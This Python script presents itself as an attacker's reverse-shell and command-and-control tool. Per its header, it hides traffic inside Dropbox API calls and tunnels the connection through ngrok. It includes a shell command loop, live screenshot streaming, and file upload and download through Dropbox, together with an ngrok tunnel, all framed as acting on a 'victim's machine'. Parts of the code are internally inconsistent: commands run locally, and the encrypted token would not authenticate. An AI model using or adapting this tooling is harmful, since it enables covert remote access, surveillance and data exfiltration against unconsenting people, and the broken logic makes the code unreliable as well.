# This script integrates Dropbox API functionality to facilitate communication between the compromised system and the attacker-controlled server, thereby potentially hiding the traffic within legitimate Dropbox communication.

import subprocess
import sys
import time
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import pickle

# ANSI color codes for formatted output
BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

print(BLUE + """
⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                             
                      *****:              .*****                      
                   +*********=          -*********+                   
                -***************      +**************=                
             :********************  ********************-             
           **********************.  .**********************           
             +****************.         *****************             
               :***********.              .***********-               
                  ******.                    .******.                 
                    *                            *                    
                  .****.                       ****.                  
                -*********.                 *********=                
              ***************            ***************              
           .********************.    .********************.           
            -********************************************-            
               =*****************    =****************+               
                  +***********: :****- .***********+                  
                     *******. =********+  *******                     
                        **  **************  **.  .                    
                     ***  ******************. ***.                    
                      +*************************                      
                         =******************+                         
                            -************=                            
                               :******-                               
""" + RESET)

# Function to get attacker information
def get_attacker_info():
    attacker_ip = input("[+] Enter the IP for the reverse shell: ")
    return attacker_ip

# Function to encrypt access token
def encrypt_access_token(token):
    key = input("[+] Enter your AES key (must be 16, 24, or 32 bytes long): ").encode()
    if len(key) not in [16, 24, 32]:
        print(RED + "[*] Invalid key length. AES key must be 16, 24, or 32 bytes long." + RESET)
        sys.exit(1)
    cipher = AES.new(key, AES.MODE_ECB)
    token_padded = pad(token.encode(), AES.block_size)
    return base64.b64encode(cipher.encrypt(token_padded)).decode()

# Function to save session
def save_session(sessions):
    with open("saved_session_dropbox.txt", "wb") as f:
        pickle.dump(sessions, f)

# Function to load session
def load_session():
    sessions = {}
    if os.path.exists("saved_session_dropbox.txt"):
        with open("saved_session_dropbox.txt", "rb") as f:
            sessions = pickle.load(f)
    return sessions

# Main function
def main():
    # Load any saved sessions
    sessions = load_session()

    # Get attacker info if no saved session
    if not sessions:
        access_token = input("[+] Enter your Dropbox access token: ")
        ip = get_attacker_info()
        port = input("[+] Enter the port number for the reverse shell and ngrok: ")
    else:
        session_choice = input("[*] Do you want to continue a saved session? (yes/no): ")
        if session_choice.lower() == "yes":
            print("[*] Available sessions:")
            for session_id, session_info in sessions.items():
                print(f"Session ID: {session_id}, IP: {session_info['ip']}, Port: {session_info['port']}")
            session_id = input("[*] Enter session ID to continue: ")
            ip = sessions[session_id]['ip']
            port = sessions[session_id]['port']
        else:
            access_token = input("[+] Enter your Dropbox access token: ")
            ip = get_attacker_info()
            port = input("[+] Enter the port number for the reverse shell and ngrok: ")

    print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
    # Start ngrok tunnel
    ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
    time.sleep(3)  # Allow ngrok to establish the tunnel

    access_token_encrypted = encrypt_access_token(access_token)

    # Dropbox API headers
    headers = {
        "Authorization": f"Bearer {access_token_encrypted}",
        "Content-Type": "application/octet-stream",
        "Dropbox-API-Arg": "",
        "User-Agent": "Dropbox-API-Client/1.0",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
    }

    # Setup socket for reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
    client_socket, addr = s.accept()

    # Start shell and virtual display
    shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    display = Display(visible=0, size=(800, 600))
    display.start()

    # Load existing sessions or create new ones
    session_counter = max([int(session_id) for session_id in sessions.keys()], default=0) + 1

    # Main command loop
    while True:
        command = input(RED + "[*] BEAR >> " + RESET)
        if command.lower() == "exit":
            break

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        stdout = result.stdout
        stderr = result.stderr

        client_socket.send(command.encode())

        if stdout:
            print(GREEN + stdout + RESET)
            print(GREEN + "[+] Command executed successfully!" + RESET)
            client_socket.send(stdout.encode())
        else:
            print(RED + "[!] No output returned from the victim's machine." + RESET)

        if stderr:
            client_socket.send(stderr.encode())

        # Handle additional commands like "screen", "upload", etc.
        if command.lower() == "screen":
            session_id = str(session_counter)
            session_counter += 1
            sessions[session_id] = {"ip": ip, "port": port}
            print(f"Started screen session {session_id}")

            screen = pyautogui.screenshot()
            screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

            client_socket.send(screen_data.encode())

            try:
                while True:
                    screen = pyautogui.screenshot()
                    screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')
                    client_socket.send(screen_data.encode())
                    time.sleep(0.1)
            except KeyboardInterrupt:
                print("\nScreen session ended.")
                break

        elif command.lower() == "upload":
            file_path = input("Enter the path of the file to upload: ")
            file_name = os.path.basename(file_path)
            with open(file_path, "rb") as f:
                file_data = f.read()
            headers["Dropbox-API-Arg"] = '{"path": "/' + file_name + '"}'
            url = "https://content.dropboxapi.com/2/files/upload"
            response = requests.post(url, headers=headers, data=file_data)
            client_socket.send(response.text.encode())

        elif command.lower() == "download":
            file_path = input("Enter the path of the file to download: ")
            headers["Dropbox-API-Arg"] = '{"path": "/' + file_path + '"}'
            url = "https://content.dropboxapi.com/2/files/download"
            response = requests.post(url, headers=headers)
            with open(os.path.basename(file_path), "wb") as f:
                f.write(response.content)
            client_socket.send("File downloaded successfully.".encode())

        elif command.lower() == "list_files":
            url = "https://api.dropboxapi.com/2/files/list_folder"
            data = {"path": ""}
            response = requests.post(url, headers=headers, json=data)
            client_socket.send(response.text.encode())

    # Save the current session before exit
    save_session(sessions)

    # Close connections and clean up
    client_socket.close()
    s.close()
    display.stop()
    ngrok_process.terminate()

if __name__ == "__main__":
    main()
